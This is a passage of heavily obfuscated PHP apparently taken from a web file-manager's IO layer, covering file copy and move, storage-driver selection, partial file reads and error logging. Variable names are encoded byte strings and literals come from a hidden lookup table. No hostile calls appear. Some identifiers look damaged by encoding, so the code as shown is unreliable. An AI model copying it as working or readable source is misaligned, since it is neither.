$—Ñèö¾ = $ÂÃš¸ŠÀ[1189] . $²·øÔ˜Ï . $ÂÃš¸ŠÀ[1190]; } else { $—Ñèö¾ = (stripos($Ïš“˜¼, $ÂÃš¸ŠÀ[11]) ? $ÂÃš¸ŠÀ[1191] : $ÂÃš¸ŠÀ[12]) . ($ÂÃš¸ŠÀ[1192] . $Ïš“˜¼ . $ÂÃš¸ŠÀ[1193] . $Ûª²Û¿«); } $‘·½©˜Ù[] = $—Ñèö¾; } $Š”Ï¬´ = array($ÂÃš¸ŠÀ[1194] . $‡¡˜÷â€ . $ÂÃš¸ŠÀ[1195], $ÂÃš¸ŠÀ[1196] . $‡¡˜÷â€ . $ÂÃš¸ŠÀ[1197], implode($ÂÃš¸ŠÀ[50] . PHP_EOL, $‘·½©˜Ù), $ÂÃš¸ŠÀ[1198]); $ÃèôíÍ† = implode(PHP_EOL, $Š”Ï¬´); if ($¸¢şÕÉÑ && $¸¢şÕÉÑ == $ÂÃš¸ŠÀ[857]) { return $ÃèôíÍ†; } $˜ÓŒ¿ûÁ = array($ÂÃš¸ŠÀ[857] => $ÃèôíÍ†, $ÂÃš¸ŠÀ[13] => $–ËûóàØ); return $¸¢şÕÉÑ ? $˜ÓŒ¿ûÁ[$¸¢şÕÉÑ] : $˜ÓŒ¿ûÁ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¬ˆĞÏ™Ñ, $˜‰àë‹†) { $ÂËª«¡ò =& $_SERVER[Ö†ØøÖ±]; $‚“ÔÆùª = $˜‰àë‹†; $GLOBALS[$ÂËª«¡ò[1199]] = $ÂËª«¡ò[1200] . $¬ˆĞÏ™Ñ; Hook::trigger($ÂËª«¡ò[1200] . $¬ˆĞÏ™Ñ . $ÂËª«¡ò[1201], $‚“ÔÆùª); $Ö¬ = self::driverMake($˜‰àë‹†[0]); if (!$Ö¬) { return !1; } if (method_exists($Ö¬, $¬ˆĞÏ™Ñ)) { $Æøç »ï = @call_user_func_array(array($Ö¬, $¬ˆĞÏ™Ñ), $˜‰àë‹†); } else { if (method_exists($Ö¬, $ÂËª«¡ò[1202])) { $Æøç »ï = @call_user_func_array(array($Ö¬, $¬ˆĞÏ™Ñ), $˜‰àë‹†); } else { if (method_exists(self, $¬ˆĞÏ™Ñ)) { $Æøç »ï = @call_user_func_array(array(self, $¬ˆĞÏ™Ñ), $˜‰àë‹†); } else { $Æøç »ï = call_user_func_array(array(parent, $¬ˆĞÏ™Ñ), $˜‰àë‹†); } } } Hook::trigger($ÂËª«¡ò[1200] . $¬ˆĞÏ™Ñ . $ÂËª«¡ò[1203], $‚“ÔÆùª, $Æøç »ï); return $Æøç »ï; } public static function init($»±ªÜ ) { return self::driverMake($»±ªÜ ); } public static function copy($Ò¡ôíñÒ, $¸–ÔÓ—Ü, $¾ùä…Õ† = false, $Ô¹ñªÈ = false) { return self::copyMoveStart($Ò¡ôíñÒ, $¸–ÔÓ—Ü, $¾ùä…Õ†, $_SERVER[Ö†ØøÖ±][595], $Ô¹ñªÈ); } public static function move($õ‰ƒàÁ€, $ô¶­Ûê“, $µ°Ñ²œ = false, $ìÑòßæ = false) { return self::copyMoveStart($õ‰ƒàÁ€, $ô¶­Ûê“, $µ°Ñ²œ, $_SERVER[Ö†ØøÖ±][597], $ìÑòßæ); } private static function copyMoveStart($—ÚÆÇß·, $„ØÈı¶, $Äø›Ò€Ç, $ğ°Ç´÷ü, $–¹ÏıÀ) { $»åÈ½ =& $_SERVER[Ö†ØøÖ±]; $øÊ£åĞ = array($—ÚÆÇß·, $„ØÈı¶, $Äø›Ò€Ç, $–¹ÏıÀ); Hook::trigger($»åÈ½[1200] . $ğ°Ç´÷ü . $»åÈ½[1201], $øÊ£åĞ); $”øˆ­öœ = self::copyMove($—ÚÆÇß·, $„ØÈı¶, $Äø›Ò€Ç, $ğ°Ç´÷ü, $–¹ÏıÀ); Hook::trigger($»åÈ½[1200] . $ğ°Ç´÷ü . $»åÈ½[1203], $øÊ£åĞ, $”øˆ­öœ); return $”øˆ­öœ; } public static function saveFile($ïÊìî×ó, $µ¸”ñ¬¶, $ØÅâÄçú = true) { $ÁæÒ…ÌÛ =& $_SERVER[Ö†ØøÖ±]; $ãÇãğĞÙ = self::info($µ¸”ñ¬¶); $ù¸Ì“¬¾ = self::driverMake($ïÊìî×ó); $åÛ˜§û = self::driverMake($µ¸”ñ¬¶); $Å¤«‰€Ô = !1; if ($åÛ˜§û->pathParse[$ÁæÒ…ÌÛ[1204]]) { $Å¤«‰€Ô = $åÛ˜§û; $½ø×å¡ = $åÛ˜§û->pathParse[$ÁæÒ…ÌÛ[1204]]; $åÛ˜§û = self::driverMake($½ø×å¡); } if ($ù¸Ì“¬¾->pathParse[$ÁæÒ…ÌÛ[1204]]) { $úšÕœ±© = $ù¸Ì“¬¾->pathParse[$ÁæÒ…ÌÛ[1204]]; $ù¸Ì“¬¾ = self::driverMake($úšÕœ±©); } $Ş‘É÷ß€ = $åÛ˜§û->pathFather($µ¸”ñ¬¶); $Ù— É¶— = !0; if (!$ØÅâÄçú && self::driverIsSame($ù¸Ì“¬¾, $åÛ˜§û)) { $Ù— É¶— = !1; } $ÑşµÍ¸Ÿ = self::copyFile($ù¸Ì“¬¾, $ïÊìî×ó, $åÛ˜§û, $Ş‘É÷ß€, $ãÇãğĞÙ[$ÁæÒ…ÌÛ[32]], $Ù— É¶—); if ($Å¤«‰€Ô) { $ÑşµÍ¸Ÿ = $Å¤«‰€Ô->getPathOuter($ÑşµÍ¸Ÿ); } return $ÑşµÍ¸Ÿ; } private static function copyMove($¦¯ Ç™È, $í±ş£ßì, $¡ÑóœÈ›, $‚¬ıÖÌ , $ß©ÃôÄĞ = false) { $Ü®°Å’€ =& $_SERVER[Ö†ØøÖ±]; if (!$¦¯ Ç™È || $¦¯ Ç™È == $Ü®°Å’€[8] || !$í±ş£ßì) { return !1; } ignore_timeout(); $Šó¨‘£å = self::driverMake($¦¯ Ç™È); $˜±Ûó²„ = self::driverMake($í±ş£ßì); $µ’ĞŸ³Ë = $‚¬ıÖÌ  == $Ü®°Å’€[597]; $¦òâÙ = !1; if ($˜±Ûó²„->pathParse[$Ü®°Å’€[1204]]) { $¦òâÙ = $˜±Ûó²„; $í±ş£ßì = $˜±Ûó²„->pathParse[$Ü®°Å’€[1204]]; $˜±Ûó²„ = self::driverMake($í±ş£ßì); } if ($Šó¨‘£å->pathParse[$Ü®°Å’€[1204]]) { $¦¯ Ç™È = $Šó¨‘£å->pathParse[$Ü®°Å’€[1204]]; $Šó¨‘£å = self::driverMake($¦¯ Ç™È); } self::check($Šó¨‘£å, $¦¯ Ç™È, $˜±Ûó²„, $í±ş£ßì); Hook::trigger($Ü®°Å’€[1205], $Šó¨‘£å, $¦¯ Ç™È, $˜±Ûó²„, $í±ş£ßì); $Ø”ìòïâ = self::driverIsSame($Šó¨‘£å, $˜±Ûó²„); if ($Ø”ìòïâ) { if ($‚¬ıÖÌ  == $Ü®°Å’€[597] && !method_exists($˜±Ûó²„, $Ü®°Å’€[1206]) && trim($í±ş£ßì, $Ü®°Å’€[8]) == trim($˜±Ûó²„->pathFather($¦¯ Ç™È), $Ü®°Å’€[8])) { if ($Šó¨‘£å->pathThis($¦¯ Ç™È) != $ß©ÃôÄĞ && !$Šó¨‘£å->isTypeObject()) { return $Šó¨‘£å->rename($¦¯ Ç™È, $ß©ÃôÄĞ); } return $˜±Ûó²„->getPathOuter($¦¯ Ç™È); } if (method_exists($˜±Ûó²„, $‚¬ıÖÌ )) { return $˜±Ûó²„->{$‚¬ıÖÌ }($¦¯ Ç™È, $í±ş£ßì, $¡ÑóœÈ›, $ß©ÃôÄĞ); } } if ($Ø”ìòïâ && $‚¬ıÖÌ  == $Ü®°Å’€[597] && $˜±Ûó²„->getType() == $Ü®°Å’€[106]) { $Íé…‰¼ƒ = $˜±Ûó²„->movePath($¦¯ Ç™È, $í±ş£ßì, $ß©ÃôÄĞ); if ($Íé…‰¼ƒ) { return $Íé…‰¼ƒ; } } $˜¤‘ñí  = $Šó¨‘£å->isFile($¦¯ Ç™È); if (!$˜¤‘ñí  && $˜±Ûó²„->getType() == $Ü®°Å’€[810] && $Šó¨‘£å->getType() == $Ü®°Å’€[106]) { $Íé…‰¼ƒ = $˜±Ûó²„->copyFolderFromIO($Šó¨‘£å, $¦¯ Ç™È, $í±ş£ßì, $¡ÑóœÈ›, $µ’ĞŸ³Ë, $ß©ÃôÄĞ); } else { $Íé…‰¼ƒ = self::copyPath($Šó¨‘£å, $¦¯ Ç™È, $˜±Ûó²„, $í±ş£ßì, $¡ÑóœÈ›, $µ’ĞŸ³Ë, $˜¤‘ñí , $ß©ÃôÄĞ); } if ($Íé…‰¼ƒ && $µ’ĞŸ³Ë) { $Šó¨‘£å->remove($¦¯ Ç™È); } if ($¦òâÙ) { $Íé…‰¼ƒ = $¦òâÙ->getPathOuter($Íé…‰¼ƒ); } return $Íé…‰¼ƒ; } private static function check($ˆÍ¿±É, $€¬ıû²ü, $‚õ™ÖÖì, &$ÎáûêâÎ) { $Õú°Ö³ò =& $_SERVER[Ö†ØøÖ±]; if (self::driverIsSame($ˆÍ¿±É, $‚õ™ÖÖì) && $ˆÍ¿±É->isFolder($€¬ıû²ü) && $ˆÍ¿±É->isParentOf($€¬ıû²ü, $ÎáûêâÎ)) { show_json(LNG($Õú°Ö³ò[1207]), !1); } if (!$ˆÍ¿±É->exist($€¬ıû²ü)) { show_json(LNG($Õú°Ö³ò[105]), !1); } } private static function copyPath($ëÙ‰â¸£, $‹Ö™¹§¡, $ŒºÓêëÇ, $Ğ‹„Íøé, $ÓÜÃ¾¡, $ŒñóÅëÄ, $È‚ÃŠŞ¸, $Ë§¬¡ÔÉ = false, $…¹º£®– = true) { $ƒ³±„ Ü =& $_SERVER[Ö†ØøÖ±]; $â¿œº¦’ = empty($Ë§¬¡ÔÉ) && $Ë§¬¡ÔÉ !== $ƒ³±„ Ü[212] ? $ëÙ‰â¸£->pathThis($‹Ö™¹§¡) : $Ë§¬¡ÔÉ; if ($ÓÜÃ¾¡) { $ë…¯ÌÏ³ = $ŒºÓêëÇ->fileNameExist($Ğ‹„Íøé, $â¿œº¦’); $Ü¾üšØä = $â¿œº¦’; $â¿œº¦’ = $ŒºÓêëÇ->fileNameAuto($Ğ‹„Íøé, $â¿œº¦’, $ÓÜÃ¾¡, !$È‚ÃŠŞ¸); if (!$ë…¯ÌÏ³ || $Ü¾üšØä != $â¿œº¦’) { $ÓÜÃ¾¡ = !1; } if ($…¹º£®– && !$ÓÜÃ¾¡) { $ŒºÓêëÇ->_data[$ƒ³±„ Ü[1208]] = !0; } } if ($È‚ÃŠŞ¸) { return self::copyFile($ëÙ‰â¸£, $‹Ö™¹§¡, $ŒºÓêëÇ, $Ğ‹„Íøé, $â¿œº¦’, $ŒñóÅëÄ); } if ($ÓÜÃ¾¡ == REPEAT_RENAME_FOLDER) { $ÓÜÃ¾¡ = !1; } $’•ÔèÆ = rtrim($Ğ‹„Íøé, $ƒ³±„ Ü[8]) . $ƒ³±„ Ü[8] . $â¿œº¦’; $¾Ü±œö¿ = $ŒºÓêëÇ->mkdir($ŒºÓêëÇ->getPath($’•ÔèÆ), $ÓÜÃ¾¡); $Ğ‹„Íøé = $ŒºÓêëÇ->getPathInner($¾Ü±œö¿); $¬ëññ¦— = $ëÙ‰â¸£->listPath($‹Ö™¹§¡, !0); $¬ëññ¦— = is_array($¬ëññ¦—) ? $¬ëññ¦— : array($ƒ³±„ Ü[83] => array(), $ƒ³±„ Ü[82] => array()); $ıËÙş‚µ = array_merge($¬ëññ¦—[$ƒ³±„ Ü[83]], $¬ëññ¦—[$ƒ³±„ Ü[82]]); foreach ($ıËÙş‚µ as $ûµĞŞ©à) { $¥Ú–Ÿúª = $ûµĞŞ©à[$ƒ³±„ Ü[33]] == $ƒ³±„ Ü[214]; $‹Ö™¹§¡ = $ëÙ‰â¸£->getPathInner($ûµĞŞ©à[$ƒ³±„ Ü[84]]); $§ô‹·¡¢ = self::copyPath($ëÙ‰â¸£, $‹Ö™¹§¡, $ŒºÓêëÇ, $Ğ‹„Íøé, $ÓÜÃ¾¡, $ŒñóÅëÄ, $¥Ú–Ÿúª, !1, !1); if (!$§ô‹·¡¢) { IO::errorTips($ƒ³±„ Ü[1209] . $‹Ö™¹§¡ . $ƒ³±„ Ü[70] . $Ğ‹„Íøé); } } self::copyMoveKeepInfo($ëÙ‰â¸£, $‹Ö™¹§¡, $¾Ü±œö¿); return $¾Ü±œö¿; } private static function copyFile($ğíèƒˆ, $û¼ôÆŸÀ, $Ş†•Ù, $•®å±, $¡ŠÈÔÎ†, $¨“¢‹Æ¿) { $·Œğ×·¦ =& $_SERVER[Ö†ØøÖ±]; $•®å± = $Ş†•Ù->getPath(rtrim($•®å±, $·Œğ×·¦[8]) . $·Œğ×·¦[8] . $¡ŠÈÔÎ†); $¤Ü˜Èµê = $·Œğ×·¦[1210] . time() . rand_string(5); Hook::trigger($·Œğ×·¦[1211], $ğíèƒˆ, $û¼ôÆŸÀ, $Ş†•Ù, $•®å±, $¡ŠÈÔÎ†, $¤Ü˜Èµê); if (self::driverIsSame($ğíèƒˆ, $Ş†•Ù)) { if ($¨“¢‹Æ¿) { $ÏßúØùê = $Ş†•Ù->moveFile($û¼ôÆŸÀ, $•®å±); } else { $ÏßúØùê = $Ş†•Ù->copyFile($û¼ôÆŸÀ, $•®å±); } Hook::trigger($·Œğ×·¦[1212], $ğíèƒˆ, $û¼ôÆŸÀ, $Ş†•Ù, $•®å±, $¡ŠÈÔÎ†, $ÏßúØùê); self::copyMoveKeepInfo($ğíèƒˆ, $û¼ôÆŸÀ, $ÏßúØùê); return $ÏßúØùê; } $›ä“×àã = TEMP_FILES; if ($GLOBALS[$·Œğ×·¦[6]][$·Œğ×·¦[89]][$·Œğ×·¦[849]]) { $›ä“×àã = $GLOBALS[$·Œğ×·¦[6]][$·Œğ×·¦[89]][$·Œğ×·¦[849]]; } $ÓøÑÅÊı = $›ä“×àã; mk_dir($ÓøÑÅÊı); $¶ö¦œİ = $ÓøÑÅÊı . $¤Ü˜Èµê; $ì·ßŸÇ = $¶ö¦œİ; $¶ö¦œİ = $ğíèƒˆ->download($û¼ôÆŸÀ, $¶ö¦œİ); $¶ö¦œİ = $ğíèƒˆ->iconvApp($¶ö¦œİ); if (substr($¶ö¦œİ, strlen($›ä“×àã)) == $›ä“×àã) { $¨“¢‹Æ¿ = !0; } $ÏßúØùê = $Ş†•Ù->upload($•®å±, $¶ö¦œİ, $¨“¢‹Æ¿); self::remove($ì·ßŸÇ); Hook::trigger($·Œğ×·¦[1212], $ğíèƒˆ, $û¼ôÆŸÀ, $Ş†•Ù, $•®å±, $¡ŠÈÔÎ†, $ÏßúØùê); self::copyMoveKeepInfo($ğíèƒˆ, $û¼ôÆŸÀ, $ÏßúØùê); return $ÏßúØùê; } private static function copyMoveKeepInfo($Ø‘ÅÖ‹, $´°—çÊÆ, $É Ê½áø) { if (!$É Ê½áø) { return; } $€òôìêİ = $Ø‘ÅÖ‹->info($´°—çÊÆ); if (!is_array($€òôìêİ)) { return; } IO::setModifyTime($É Ê½áø, $€òôìêİ[$_SERVER[Ö†ØøÖ±][85]]); } public static function pathFather($Ï˜„öØ¥) { $Ìºñ²Œ£ = IO::init($Ï˜„öØ¥); $‰î“ÜñÖ = $Ìºñ²Œ£->pathFather($Ìºñ²Œ£->path); return $Ìºñ²Œ£->getPathOuter($‰î“ÜñÖ); } public static function fileOut($Ë°ìÙ, $¨Ùîğãœ = false, $Å×¹ûìÑ = false, $—‡Ñ”¸¹ = '') { $¿Áş©Ş§ = self::driverMake($Ë°ìÙ); if ($¿Áş©Ş§->isFileOutServer()) { return $¿Áş©Ş§->fileOutServer($Ë°ìÙ, $¨Ùîğãœ, $Å×¹ûìÑ, $—‡Ñ”¸¹); } return $¿Áş©Ş§->fileOut($Ë°ìÙ, $¨Ùîğãœ, $Å×¹ûìÑ, $—‡Ñ”¸¹); } public static function fileOutImage($˜âÌÙµ, $¶˜‰‹³ß = 250) { $ı¼ù‡§É = array(250, 600, 1200, 2000, 3000, 5000); for ($Öü´‘Ò¥ = 0; $Öü´‘Ò¥ < count($ı¼ù‡§É); $Öü´‘Ò¥++) { if ($Öü´‘Ò¥ == 0 && $¶˜‰‹³ß <= $ı¼ù‡§É[$Öü´‘Ò¥]) { $¶˜‰‹³ß = $ı¼ù‡§É[$Öü´‘Ò¥]; break; } else { if ($¶˜‰‹³ß > $ı¼ù‡§É[$Öü´‘Ò¥ - 1] && $¶˜‰‹³ß <= $ı¼ù‡§É[$Öü´‘Ò¥]) { $¶˜‰‹³ß = $ı¼ù‡§É[$Öü´‘Ò¥]; break; } else { if ($Öü´‘Ò¥ == count($ı¼ù‡§É) - 1 && $¶˜‰‹³ß > $ı¼ù‡§É[$Öü´‘Ò¥]) { $¶˜‰‹³ß = $ı¼ù‡§É[$Öü´‘Ò¥]; break; } } } } $İÑ“¶•ó = self::driverMake($˜âÌÙµ); if ($İÑ“¶•ó->isFileOutServer()) { return $İÑ“¶•ó->fileOutImageServer($˜âÌÙµ, $¶˜‰‹³ß); } return $İÑ“¶•ó->fileOutImage($˜âÌÙµ, $¶˜‰‹³ß); } private static function driverIsSame($ô±§á±­, $÷£×³Î) { $Ù¼ÑØ±² =& $_SERVER[Ö†ØøÖ±]; $äÔÖ×ó = $ô±§á±­->getType(); $ÃÇŠÉÕ = $÷£×³Î->getType(); if ($äÔÖ×ó != $ÃÇŠÉÕ) { return !1; } if ($äÔÖ×ó == $Ù¼ÑØ±²[810]) { return !0; } if ($äÔÖ×ó == $Ù¼ÑØ±²[106]) { return !0; } if ($ô±§á±­->pathDriver == $÷£×³Î->pathDriver) { return !0; } return !1; } public static function copyUpdate($İƒöú®ı, $ñòõÃ´õ) { $ë—¬»ï÷ =& $_SERVER[Ö†ØøÖ±]; if (!IO::exist($İƒöú®ı)) { return !1; } if (!IO::exist($ñòõÃ´õ)) { IO::mkdir($ñòõÃ´õ); } $ˆ‡÷¨Âˆ = array_to_keyvalue(self::listAllSimple($İƒöú®ı), $ë—¬»ï÷[84]); $ëÚ¤¶À¦ = array_to_keyvalue(self::listAllSimple($ñòõÃ´õ), $ë—¬»ï÷[84]); $†Ùˆ“÷Å = array(); $¬ÂÙÚÆé = array(); foreach ($ˆ‡÷¨Âˆ as $š·”ÑÅâ => $£ÈÁÒÃ) { if (isset($ëÚ¤¶À¦[$š·”ÑÅâ])) { if ($£ÈÁÒÃ[$ë—¬»ï÷[75]] == 1) { continue; } if ($ëÚ¤¶À¦[$š·”ÑÅâ][$ë—¬»ï÷[76]] == $£ÈÁÒÃ[$ë—¬»ï÷[76]]) { continue; } } if ($£ÈÁÒÃ[$ë—¬»ï÷[75]] == 1) { $¬ÂÙÚÆé[] = $ñòõÃ´õ . $ë—¬»ï÷[8] . trim($š·”ÑÅâ, $ë—¬»ï÷[8]); continue; } $æñãî Ã = strstr(trim($š·”ÑÅâ, $ë—¬»ï÷[8]), $ë—¬»ï÷[8]) ? get_path_father($š·”ÑÅâ) : $ë—¬»ï÷[12]; $†Ùˆ“÷Å[] = array($ë—¬»ï÷[1213] => $£ÈÁÒÃ[$ë—¬»ï÷[86]], $ë—¬»ï÷[1214] => rtrim($ñòõÃ´õ, $ë—¬»ï÷[8]) . $ë—¬»ï÷[8] . $æñãî Ã, $ë—¬»ï÷[1215] => $£ÈÁÒÃ); } $£ËÒ›è = array($ë—¬»ï÷[214] => $†Ùˆ“÷Å, $ë—¬»ï÷[75] => $¬ÂÙÚÆé); Hook::trigger($ë—¬»ï÷[1216], $İƒöú®ı, $ñòõÃ´õ, $£ËÒ›è); foreach ($¬ÂÙÚÆé as $£ÈÁÒÃ) { IO::mkdir($£ÈÁÒÃ); } foreach ($†Ùˆ“÷Å as $£ÈÁÒÃ) { IO::copy($£ÈÁÒÃ[$ë—¬»ï÷[1213]], $£ÈÁÒÃ[$ë—¬»ï÷[1214]], REPEAT_REPLACE); } } public static function fileSubstr($¢¤ÌÅé, $ª¶“˜şÛ, $¨½¸÷Ã° = false) { $Œ†î”éè =& $_SERVER[Ö†ØøÖ±]; $ÂšĞÊŞ = self::driverMake($¢¤ÌÅé); $Ì¸…¸è = $ÂšĞÊŞ->size($¢¤ÌÅé); $Ùá˜¸î¨ = $ª¶“˜şÛ; $Ù½ı¶õ = $¨½¸÷Ã°; if ($ª¶“˜şÛ < 0) { $ª¶“˜şÛ = $Ì¸…¸è + $ª¶“˜şÛ; } if ($¨½¸÷Ã° === !1) { $¨½¸÷Ã° = $Ì¸…¸è - $ª¶“˜şÛ; } if ($ª¶“˜şÛ + $¨½¸÷Ã° > $Ì¸…¸è) { $¨½¸÷Ã° = $Ì¸…¸è - $ª¶“˜şÛ; } if (!$Ì¸…¸è && $ÂšĞÊŞ->getType() == $Œ†î”éè[106] && !$ÂšĞÊŞ->exist($¢¤ÌÅé)) { $ìä×ÅÕ• = get_path_this($¢¤ÌÅé); $Œ…„øõé = parse_url_query($ìä×ÅÕ•); if (is_array($Œ…„øõé) && isset($Œ…„øõé[$Œ†î”éè[32]])) { $ìä×ÅÕ• = urldecode($Œ…„øõé[$Œ†î”éè[32]]); } throw new Exception($Œ†î”éè[1217] . LNG($Œ†î”éè[1218]) . $Œ†î”éè[1019] . clear_html($ìä×ÅÕ•) . $Œ†î”éè[12]); } if ($¨½¸÷Ã° <= 0) { return $Œ†î”éè[12]; } if ($ª¶“˜şÛ < 0 || $ª¶“˜şÛ >= $Ì¸…¸è || $¨½¸÷Ã° > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\122\x65\x61\x64\40\x65\162\x72\157\162\41\x20\163\164\141\x72\x74\x3d{$ª¶“˜şÛ}\73\154\145\x6e\147\x74\150\x3d{$¨½¸÷Ã°}\73\x20\163\151\x7a\x65\75{$Ì¸…¸è}\73"); } $‚üèôÙ¹ = $ÂšĞÊŞ->fileSubstr($¢¤ÌÅé, $ª¶“˜şÛ, $¨½¸÷Ã°); if (!$‚üèôÙ¹ && $¨½¸÷Ã° && isset($GLOBALS[$Œ†î”éè[1219]])) { throw new Exception($GLOBALS[$Œ†î”éè[1219]][$Œ†î”éè[1220]]); } return $‚üèôÙ¹; } private static function driverMake(&$íÈ•³©˜) { $°¤ñš§„ =& $_SERVER[Ö†ØøÖ±]; $ÄœåÎÂí = KodIO::parse($íÈ•³©˜); if (!self::$driverListSystem) { $¼ğŞƒ­† = Model($°¤ñš§„[820])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¼ğŞƒ­†, $°¤ñš§„[451]); } if ($ÄœåÎÂí[$°¤ñš§„[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÄœåÎÂí[$°¤ñš§„[451]]]) { return !1; } $íÈ•³©˜ = $ÄœåÎÂí[$°¤ñš§„[1221]]; $æ®ö¹¿¾ = self::driverGet($ÄœåÎÂí, $íÈ•³©˜); return $æ®ö¹¿¾; } private static function driverGet($ÊÑŞìò×, &$È²ÊíÕ) { $â×¬³Ù =& $_SERVER[Ö†ØøÖ±]; $ñ™à£  = $ÊÑŞìò×[$â×¬³Ù[1222]]; $Ì›¬½Å = $ÊÑŞìò×[$â×¬³Ù[451]]; switch ($ÊÑŞìò×[$â×¬³Ù[33]]) { case KodIO::KOD_IO: $İÇ›ŸÏ = self::$driverListSystem[$Ì›¬½Å]; break; case KodIO::KOD_SOURCE: $È²ÊíÕ = $Ì›¬½Å . $È²ÊíÕ; $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1224], $â×¬³Ù[6] => $ÊÑŞìò×); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $óê‹§ÕÏ = $GLOBALS[$â×¬³Ù[1225]]; self::$driverListUser = array_to_keyvalue($óê‹§ÕÏ, $â×¬³Ù[451]); } $İÇ›ŸÏ = self::$driverListUser[$Ì›¬½Å]; break; case KodIO::KOD_SHARE_LINK: $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1226], $â×¬³Ù[6] => $ÊÑŞìò×); $¢®¥×…’ = Action($â×¬³Ù[1227])->sharePathInfo($ÊÑŞìò×[$â×¬³Ù[84]]); $È²ÊíÕ = $¢®¥×…’[$â×¬³Ù[181]]; if (!$¢®¥×…’[$â×¬³Ù[181]]) { $Åæ”¸•Ø = Model($â×¬³Ù[641])->getInfo($¢®¥×…’[$â×¬³Ù[642]]); $È²ÊíÕ = KodIO::clear($Åæ”¸•Ø[$â×¬³Ù[1228]] . $ÊÑŞìò×[$â×¬³Ù[1221]]); $ÊÑŞìò×[$â×¬³Ù[537]] = $Åæ”¸•Ø; $ÊÑŞìò×[$â×¬³Ù[1204]] = $È²ÊíÕ; $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1229], $â×¬³Ù[6] => $ÊÑŞìò×); } break; case KodIO::KOD_SHARE_ITEM: $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1230], $â×¬³Ù[6] => $ÊÑŞìò×); $Åæ”¸•Ø = Model($â×¬³Ù[641])->getInfo($ÊÑŞìò×[$â×¬³Ù[451]]); if ($Åæ”¸•Ø[$â×¬³Ù[181]] == $â×¬³Ù[212]) { $È²ÊíÕ = KodIO::clear($Åæ”¸•Ø[$â×¬³Ù[1228]] . $ÊÑŞìò×[$â×¬³Ù[1221]]); $ÊÑŞìò×[$â×¬³Ù[537]] = $Åæ”¸•Ø; $ÊÑŞìò×[$â×¬³Ù[1204]] = $È²ÊíÕ; $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1231], $â×¬³Ù[6] => $ÊÑŞìò×); } else { if (!$È²ÊíÕ) { $È²ÊíÕ = $Åæ”¸•Ø[$â×¬³Ù[181]]; } } break; default: $È²ÊíÕ = $ÊÑŞìò×[$â×¬³Ù[84]]; $İÇ›ŸÏ = array($â×¬³Ù[1223] => $â×¬³Ù[1232]); break; } $ÙÏ¢Ğš = $ÊÑŞìò×[$â×¬³Ù[84]]; if (!isset(self::$driverCache[$ÙÏ¢Ğš])) { $—µÀ½–Í = strtolower($İÇ›ŸÏ[$â×¬³Ù[95]]); $´è¤ÙŞ = $GLOBALS[$â×¬³Ù[6]][$â×¬³Ù[89]][$â×¬³Ù[879]]; $…êÛ­ë× = $â×¬³Ù[74] . (isset($´è¤ÙŞ[$—µÀ½–Í]) ? $´è¤ÙŞ[$—µÀ½–Í] : ucfirst($—µÀ½–Í)); if (!class_exists($…êÛ­ë×)) { show_json("{$…êÛ­ë×}\40\156\157\x74\40\145\170\151\x73\164\x73\41", !1); } $ù÷ŠÑÊ™ = isset($İÇ›ŸÏ[$â×¬³Ù[6]]) ? $İÇ›ŸÏ[$â×¬³Ù[6]] : !1; self::$driverCache[$ÙÏ¢Ğš] = new $…êÛ­ë×($ù÷ŠÑÊ™); } $—¤Ä³¡é = self::$driverCache[$ÙÏ¢Ğš]; $—¤Ä³¡é->pathDriver = $ñ™à£ ; $—¤Ä³¡é->pathBase = $â×¬³Ù[12]; if (isset($İÇ›ŸÏ[$â×¬³Ù[6]][$â×¬³Ù[1233]])) { $—¤Ä³¡é->pathBase = rtrim($İÇ›ŸÏ[$â×¬³Ù[6]][$â×¬³Ù[1233]], $â×¬³Ù[8]) . $â×¬³Ù[8]; $È²ÊíÕ = $—¤Ä³¡é->pathBase . ltrim($È²ÊíÕ, $â×¬³Ù[8]); } $È²ÊíÕ = $—¤Ä³¡é->getPath($È²ÊíÕ); if (isset($ÊÑŞìò×[$â×¬³Ù[1204]])) { $È²ÊíÕ = $ÊÑŞìò×[$â×¬³Ù[1204]]; } $—¤Ä³¡é->path = $È²ÊíÕ; return $—¤Ä³¡é; } public static function errorTips($Ãß¹ËÏÍ = false) { $ü¼â´¡ =& $_SERVER[Ö†ØøÖ±]; static $Ğ˜ïĞÃÚ = array(); $¥èúõĞû = 1000; if ($Ãß¹ËÏÍ === -1) { return $Ğ˜ïĞÃÚ ? $Ğ˜ïĞÃÚ[count($Ğ˜ïĞÃÚ) - 1] : $ü¼â´¡[12]; } if ($Ãß¹ËÏÍ === !1) { return implode($ü¼â´¡[246], $Ğ˜ïĞÃÚ); } if (count($Ğ˜ïĞÃÚ) >= $¥èúõĞû) { $Ğ˜ïĞÃÚ = array_slice($Ğ˜ïĞÃÚ, $¥èúõĞû * 0.5, $¥èúõĞû); } $Ğ˜ïĞÃÚ[] = $Ãß¹ËÏÍ; write_log($ü¼â´¡[163] . ACTION . $ü¼â´¡[1234] . $Ãß¹ËÏÍ, $ü¼â´¡[1235]); } public static function getLastError($”µÃüÕ¼ = '') { $ÍÛßøÀª = self::errorTips(-1); return $ÍÛßøÀª ? $ÍÛßøÀª : $”µÃüÕ¼; } } goto D¨“¥œŒÜ­; bÈë™©¹…›: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($•šùàßñ) { if (substr($•šùàßñ, 0, 2) == $_SERVER[Ö†ØøÖ±][1406]) { $•šùàßñ = BASIC_PATH . substr($•šùàßñ, 2); } return $•šùàßñ; } public function iconvApp($éø¦üœÎ) { $…ş³Œê´ =& $_SERVER[Ö†ØøÖ±]; global $config; return $this->iconvTo($éø¦üœÎ, $config[$…ş³Œê´[1404]], $config[$…ş³Œê´[1403]]); } public function iconvSystem($Ñˆç¥‹) { $âÛ¶áìû =& $_SERVER[Ö†ØøÖ±]; global $config; return $this->iconvTo($Ñˆç¥‹, $config[$âÛ¶áìû[1403]], $config[$âÛ¶áìû[1404]]); } public function getPathOuter($ğĞ÷·à) { 